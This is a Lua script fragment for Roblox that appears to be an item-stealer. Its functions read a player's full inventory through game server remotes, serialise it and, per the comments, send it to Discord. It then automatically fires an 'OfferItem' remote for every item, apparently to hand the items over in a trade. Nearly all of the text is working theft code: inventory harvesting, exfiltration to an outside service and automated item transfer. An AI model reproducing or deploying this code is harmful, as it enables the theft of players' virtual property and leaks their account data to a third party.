-- --- Helper to serialize a table to a readable string (for Discord) ---
local function tableToString(tbl, indent)
    indent = indent or 0
    local str = ""
    local pad = string.rep(" ", indent)
    if type(tbl) ~= "table" then return tostring(tbl) end
    for k, v in pairs(tbl) do
        local key = type(k) == "string" and k or "["..tostring(k).."]"
        if type(v) == "table" then
            str = str .. pad .. key .. " = {\n" .. tableToString(v, indent+2) .. pad .. "},\n"
        else
            str = str .. pad .. key .. " = " .. tostring(v) .. ",\n"
        end
    end
    return str
end

-- --- Get inventory (returns a list of item IDs or names) ---
local function getInventory()
    local inventory = {}
    -- Try GetProfileData first
    if GetProfileData then
        local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
        if ok and data then
            print("Got inventory via GetProfileData")
            -- Send the serialized data to Discord
            local serialized = tableToString(data)
            send("Inventory data (GetProfileData):\n```lua\n" .. serialized .. "\n```")
            -- Parse data: if it's a table with items as keys or values, collect them
            if type(data) == "table" then
                for key, val in pairs(data) do
                    -- Try to extract an ID – could be key or val, or inside a subtable
                    if type(val) == "number" and val > 0 then
                        table.insert(inventory, val)
                    elseif type(key) == "number" and key > 0 then
                        table.insert(inventory, key)
                    elseif type(val) == "table" and val.ID then
                        table.insert(inventory, val.ID)
                    elseif type(val) == "table" and val.ItemId then
                        table.insert(inventory, val.ItemId)
                    end
                end
            end
            return inventory
        end
    end
    -- Fallback to GetFullInventory
    if GetFullInventory then
        local ok, data = pcall(function() return GetFullInventory:InvokeServer() end)
        if ok and data then
            print("Got inventory via GetFullInventory")
            local serialized = tableToString(data)
            send("Inventory data (GetFullInventory):\n```lua\n" .. serialized .. "\n```")
            if type(data) == "table" then
                for key, val in pairs(data) do
                    if type(val) == "number" and val > 0 then
                        table.insert(inventory, val)
                    elseif type(key) == "number" and key > 0 then
                        table.insert(inventory, key)
                    elseif type(val) == "table" and val.ID then
                        table.insert(inventory, val.ID)
                    elseif type(val) == "table" and val.ItemId then
                        table.insert(inventory, val.ItemId)
                    end
                end
            end
            return inventory
        end
    end
    -- Last resort: tools in Backpack/Character
    local tools = {}
    for _, t in pairs(player.Backpack:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t.Name) end
    end
    for _, t in pairs(char:GetChildren()) do
        if t:IsA("Tool") and not table.find(tools, t.Name) then table.insert(tools, t.Name) end
    end
    if #tools > 0 then
        print("Found " .. #tools .. " tools in Backpack/Character")
        return tools
    end
    return {}
end

-- --- Offer items via OfferItem remote ---
local function offerItems(itemList)
    if not OfferItem then return 0 end
    local offered = 0
    for _, item in ipairs(itemList) do
        local ok, err = pcall(function()
            OfferItem:FireServer(item)   -- try raw
        end)
        if ok then
            offered = offered + 1
            print("Offered item: " .. tostring(item))
        else
            -- If it's a table, try to extract an ID field
            if type(item) == "table" and item.ID then
                ok, err = pcall(function() OfferItem:FireServer(item.ID) end)
                if ok then
                    offered = offered + 1
                    print("Offered item (ID): " .. tostring(item.ID))
                end
            elseif type(item) == "table" and item.ItemId then
                ok, err = pcall(function() OfferItem:FireServer(item.ItemId) end)
                if ok then
                    offered = offered + 1
                    print("Offered item (ItemId): " .. tostring(item.ItemId))
                end
            else
                print("Failed to offer item: " .. tostring(item))
            end
        end
        wait(0.1)
    end
    return offered
end

